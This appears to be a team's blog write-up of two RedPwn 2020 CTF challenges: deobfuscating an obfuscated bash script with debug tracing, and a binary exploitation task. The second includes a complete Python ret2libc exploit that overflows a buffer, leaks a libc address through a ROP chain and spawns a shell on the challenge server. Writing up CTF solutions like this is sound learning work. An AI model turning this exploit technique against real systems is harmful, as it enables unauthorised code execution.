---
layout: post
title: RedPwn CTF Writeup
date: 2020-06-25 01:00 +0700
modified: 2020-03-07 16:49:47 +07:00
description: Our First Team CTF
tag:
  - ctf
  - writeup
image: /cara-memperbarui-fork-repository/repo.png
---
# Categories 

+  [Misc](#misc)
+  [Pwn](#pwn)

## Misc
### misc/uglybash
**Solved By:** tbutler0x90  
**Points:** 359  
**Flag:** flag{us3_zsh,-dummy}

##### Challenge
This bash script evaluates to echo dont just run it, dummy # flag{...} where the flag is in the comments.The comment won't be visible if you just execute the script. How can you mess with bash to get the value right before it executes?    

*Exerpt of Challenge Script, cmd.sh*
>  ```${*%c-dFqjfo}  e$'\u0076'al "$(   ${*%%Q+n\{}   "${@~}" $'\160'r""$'\151'$@nt"f" %s   ' }~~@{$"```

##### Solution
1) To see what the bash script evaluates to just prior to execution, the subshell option was used to run the entire script in debug mode with the -x flag. Additionally, parameters were added to the script to print the debug output to a file.

```bash
#!/bin/bash
exec 5> debug_output.txt
BASH_XTRACEFD="5"
### original script goes below here
```
2) The script was run with the -x flag. 
```bash
bash -x cmd.exe
```

3) Flag was located in the comments along the left side in the debug_output.txt, lines 70 -108  
<figure>
<img src="uglybash.png" alt="results of debug">
<figcaption>Fig 1. Flag is spelled out downwards on the left side</figcaption>
</figure>

## Pwn
### pwn/the-library
**Solved By:** cernec1999  
**Points:** 424  
**Flag:** flag{jump_1nt0_th3_l1brary}

##### Challenge
There's not a lot of useful functions in the binary itself. I wonder where you can get some...

##### Solution
When solving a binary exploitation task, the first step I normally take is to check out the permissions of the binary. We can use the ```checksec``` tool to do this. Additionally, we should check out the architecture of the binary.

```console
cernec1999@ccerne:~/Downloads$ checksec the-library
[*] '/home/cernec1999/Downloads/the-library'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
cernec1999@ccerne:~/Downloads$ file the-library 
the-library: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3067a5291814bef337dafc695eee28f371370eae, not stripped
```

With this information, it seems that intermediate binary exploitation techniques can be applied to solve this challenge. Fortunately, there are no stack cookies and the binary is not position independent. However, DEP is enabled, so we cannot simply jump to the stack to run shellcode.

Because of the challenge name, ```the-library```, my best assumption is that we need to jump to libc.

We are given no information about the host system, but we can assume that full ASLR is enabled and that the libraries are randomized. This means that every time a binary executes, the kernel assigns it a new base address to make exploitation harder. Thus, there must be a way for us to somehow leak the libc base address for system.

Unfortunately, we cannot use a print format vulnerability to leak the base address of libc. Instead, we can use a traditional buffer overflow vulnerability, utilizing some ROP gadgets, to gather the information that we need. Fortunately, we are given the source, so we can easily figure out how to trigger the overflow.

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to the library... What's your name?");

  read(0, name, 0x100);
  puts("Hello there: ");
  puts(name);
}
```

Using GDB, I figured out that exactly 24 bytes can be written into ```name``` before the return address is written to. Next, it is time to figure out useful gadgets to leak the libc base address. This should be pretty easy with a couple of leaked gadgets. In the Global Offset Table, at address ```0x600ff0``` is where ```__libc_start_main``` is stored. We can call ```puts``` in the binary to leak this address. Finally, we should jump back to the start of the code to get another overflow to jump to the ```system``` address in the libc library. Here is the code to do all of that:

```python
import struct, sys, telnetlib

# Connection info
HOST = '2020.redpwnc.tf'
PORT = '31350'

# Init a new Telnet session
my_tel = telnetlib.Telnet(HOST, PORT)

def p64_b(num):
    return struct.pack('<Q', num)

def p64_i(b_arr):
    return struct.unpack('<Q', b_arr)[0]

# Gadgets to leak libc
POP_RDI_RET = p64_b(0x400733)
LIBC_START = p64_b(0x600ff0)
PUTS_PLT = p64_b(0x400520)
START = p64_b(0x400550)

# Leak __libc_start_main address then jump 
chain = b'A'*24 + POP_RDI_RET + LIBC_START + PUTS_PLT + START
my_tel.write(chain)
```

Next, given this information, we should figure out where in libc to jump to. Fortunately, we are given the libc that is linked at runtime on the host system. There is a [great resource you can use](https://libc.blukat.me/) to identify a version of libc easily. I used this tool to figure out that the library is ```libc6_2.27-3ubuntu1_amd64```. It additionally calculated the offsets to useful functions.

![libc6_2.27-3ubuntu1_amd64 offsets](libc.png)

Using this useful information, we can do the following:

1. Put a pointer to /bin/sh into RDI
2. Jump to system

Thus, our finished exploit looks like this:

```python
#!/usr/bin/python3

import struct, sys, telnetlib

# Connection info
HOST = '2020.redpwnc.tf'
PORT = '31350'

# Init a new Telnet session
my_tel = telnetlib.Telnet(HOST, PORT)

def p64_b(num):
    return struct.pack('<Q', num)

def p64_i(b_arr):
    return struct.unpack('<Q', b_arr)[0]

# Gadgets to leak libc
POP_RDI_RET = p64_b(0x400733)
LIBC_START = p64_b(0x600ff0)
PUTS_PLT = p64_b(0x400520)
START = p64_b(0x400550)

# Leak __libc_start_main address then jump 
chain = b'A'*24 + POP_RDI_RET + LIBC_START + PUTS_PLT + START
my_tel.write(chain)

# Get rid of junk
my_tel.read_until(b'there: ')
my_tel.read_until(b'\x0a')
my_tel.read_until(b'\x0a')

# Find address of libc, then turn it into system
libc_base = p64_i(my_tel.read_very_eager()[0:6] + b'\x00\x00')

# Now, with new information, jump to system!
BIN_SH_STR = p64_b(libc_base + 0x1923ea)
RET_GADGET = p64_b(0x400506)
SYSTEM_ADDR = p64_b(libc_base + 0x2d990)

# Construct the ROP chain
chain = b'A' * 24 + POP_RDI_RET + BIN_SH_STR + RET_GADGET + SYSTEM_ADDR

my_tel.write(chain)
my_tel.interact()
```

Viola!

```console
cernec1999@ccerne:~/Downloads$ ./exp.py 
Hello there: 
AAAAAAAAAAAAAAAAAAAAAAAA3@
cat flag.txt
flag{jump_1nt0_th3_l1brary}
```